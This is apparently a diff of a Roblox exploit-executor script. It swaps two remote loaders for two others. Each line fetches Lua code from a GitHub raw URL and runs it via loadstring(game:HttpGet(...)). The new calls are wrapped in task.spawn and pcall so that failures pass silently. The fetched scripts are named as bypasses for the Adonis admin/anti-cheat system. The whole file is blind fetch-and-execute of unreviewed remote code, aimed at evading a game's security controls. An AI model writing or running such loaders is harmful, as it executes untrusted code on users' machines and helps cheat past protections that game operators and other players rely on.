@@ -1,2 +1,11 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XORAWasBanned/Roblox/refs/heads/main/Scripts/Utilities%20/Bypasses/Adonis.luau", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/refs/heads/main/Bypass%20Dan%20FFA.luau", true))()
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/xqmt/Resolution-loader/refs/heads/main/Bypass-adonis", true))()
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/xqmt/Resolution-loader/refs/heads/main/Bypass", true))()
+    end)
+end)
